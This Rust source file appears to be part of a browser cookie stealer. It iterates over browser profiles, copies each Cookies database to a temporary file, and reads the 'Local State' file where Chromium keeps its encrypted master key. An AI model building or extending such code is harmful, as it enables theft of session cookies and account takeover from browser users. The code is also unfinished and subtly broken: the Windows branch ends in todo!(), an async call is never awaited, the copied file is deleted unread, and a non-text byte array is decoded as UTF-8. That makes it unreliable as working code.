use std::path::PathBuf;

pub(super) async fn get_cookies(
    path: &mut PathBuf,
    profiles: &Vec<String>,
    tempfile: &PathBuf,
) -> std::io::Result<()> {
    let key = get_encrypted_key(path.clone());

    for profile in profiles {
        path.push(profile);
        if cfg!(target_os = "windows") {
            path.push("/Network");
        }
        path.push("/Cookies");

        super::check_db_size(path).await?;

        // Copy the file to the temporary folder
        std::fs::copy(&path, tempfile).unwrap();

        std::fs::remove_file(tempfile).unwrap();
        path.pop();
        if cfg!(target_os = "windows") {
            path.pop();
        }
        path.pop();
    }

    Ok(())
}

async fn get_encrypted_key(mut key_path: PathBuf) -> String {
    if cfg!(target_os = "windows") {
        key_path.push("/Local State");

        if let Ok(encrypted_key) = tokio::fs::read_to_string(key_path).await {
            // deserialize master_key
        }

        todo!()
    } else {
        let key: Vec<u8> = vec![
            0x76, 0x31, 0x31, 0xB9, 0xBA, 0xC6, 0x4A, 0x63, 0x4A, 0xE5, 0x31, 0xD2, 0xBA, 0xF0,
            0x29, 0xCF, 0x8F, 0x49, 0xEC, 0xF8, 0x0A, 0xBA, 0x90, 0xC1, 0x27, 0xB7, 0xB6, 0xB0,
            0x2C, 0x50, 0xDA, 0x8C, 0xBA, 0x9B, 0x08, 0x4F, 0xFE, 0x7E, 0x7B, 0x93, 0xC5, 0xEA,
            0x5F, 0x87, 0x6A, 0x6A, 0x7C, 0x38, 0x49, 0x72, 0x58, 0x1C, 0x18, 0xF3, 0x22, 0xCA,
            0x16, 0x2B, 0xF7, 0xBD, 0x64, 0x18, 0x32, 0x30, 0xFB, 0x06, 0x92, 0x5C, 0x3C, 0x98,
            0x74, 0xBD, 0xD6, 0x81, 0x67, 0x45, 0x9B, 0x28, 0xCF, 0xEA, 0x8A, 0x16, 0xF2,
        ];
        return String::from_utf8(key).unwrap();
    }
}
